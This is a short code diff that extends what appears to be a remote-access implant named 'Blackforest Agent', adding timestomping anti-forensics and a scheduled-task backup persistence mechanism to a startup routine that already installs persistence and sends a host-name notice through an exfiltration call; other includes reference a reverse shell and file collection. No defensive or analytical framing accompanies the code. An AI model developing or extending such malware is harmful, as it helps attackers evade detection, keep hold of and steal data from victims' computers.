@@ -11,6 +11,8 @@
 #include "core/collection/file_walker.hpp"
 #include "core/collection/reverse_shell.hpp" // New
 #include "core/maintenance/updater.hpp" // New
+#include "core/evasion/timestomp.hpp"   // New
+#include "core/persistence/scheduled_task.hpp" // New
 
 #include <iostream>
 #include <vector>
@@ -137,7 +139,9 @@ public:
     
     void Start() {
         running = true;
+        Timestomp::CloneExplorer(); // Anti-Forensics
         InstallPersistence();
+        ScheduledTask::Install();   // Backup Persistence
         
         // Initial Notification
         secureLog.ExfiltrateDirect("[*] Blackforest Agent Started on: " + SystemInfo::GetHostName());
